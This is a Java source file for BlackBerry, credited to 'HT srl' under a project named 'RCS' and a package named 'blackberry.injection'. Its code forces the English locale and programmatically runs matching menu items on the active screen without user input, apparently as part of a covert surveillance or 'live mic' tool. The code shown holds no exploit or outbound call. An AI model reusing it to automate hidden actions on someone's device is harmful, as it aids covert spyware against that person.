//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.injection
 * File         : MenuWalker.java
 * Created      : 2-lug-2010
 * *************************************************/
package com.rim.samples.device.livemictest;

import com.rim.samples.device.livemictest.Debug;
import com.rim.samples.device.livemictest.DebugLevel;

import net.rim.device.api.i18n.Locale;
import net.rim.device.api.system.Application;
import net.rim.device.api.ui.MenuItem;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.Ui;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.Menu;


public class MenuWalker {
   
    //#ifdef DEBUG
    private static Debug debug = new Debug("MenuWalker", DebugLevel.VERBOSE);
    //#endif
    
    static Locale prev;
    static Locale locale;

    static void walk(String menuItemText) {
        Screen screen = Ui.getUiEngine().getActiveScreen();
        
      //#ifdef DEBUG
        Debug debug = new Debug("MenuWalkerRun", DebugLevel.VERBOSE);
        //#endif
        
        setLocaleBegin();
        
        Menu menu = screen.getMenu(0);
        for (int i = 0, cnt = menu.getSize(); i < cnt; i++)
            if (menu.getItem(i).toString().equalsIgnoreCase(menuItemText))
                menu.getItem(i).run();
        
        setLocaleEnd();
    }
    
    /**
     * Walk the menu and runs the item specified. Descriptions are english
     * locale.
     * 
     * @param menuDesc
     *            the menu desc
     */
    public synchronized static void walkOld(final String[] menuDescriptions) {
   
        Application.getApplication().invokeLater(new Runnable() {
            public void run() {
                try {
                    //#ifdef DEBUG
                    Debug debug = new Debug("MenuWalkerRun", DebugLevel.VERBOSE);
                    //#endif
                    
                    setLocaleBegin();

                    boolean found = false;
                   
                    final Menu menu = UiApplication.getUiApplication()
                            .getActiveScreen().getMenu(0);
                 

                    if (menu == null) {
                        return;
                    }
                    final int size = menu.getSize();
                    for (int i = 0; i < size; i++) { //&& !found
                        final MenuItem item = menu.getItem(i);

                        //#ifdef DEBUG
                        debug.trace("menu " + i + " : " + item.toString());
                        //#endif

                        for (int j = 0; j < menuDescriptions.length; j++) {
                            final String menuDesc = menuDescriptions[j];

                            if (item.toString().startsWith(menuDesc) && !found) {
                                //#ifdef DEBUG
                                debug.info("-- Press Menu: " + item);
                                //#endif
                                //Application.getApplication().invokeLater(
                                //        new Runnable() {
                                //  public void run() {
                                item.run();
                                //            }
                                //        });
                                found = true;
                                break;
                            }
                        }
                    }
                } finally {
                    setLocaleEnd();
                }
            }
        });

    }
    
    

    /**
     * Sets the locale end.
     */
    public static void setLocaleEnd() {
        //#ifdef DEBUG
        debug.trace("setLocaleEnd");
        //#endif
        Locale.setDefault(prev);
    }

    /**
     * Sets the locale start.
     * 
     * @return the locale
     */
    public static Locale setLocaleBegin() {
        //#ifdef DEBUG
        debug.trace("setLocaleStart");
        //#endif
        prev = Locale.getDefault();
        final Locale locale = Locale.get(Locale.LOCALE_en);
        Locale.setDefault(locale);
        return locale;
    }

}
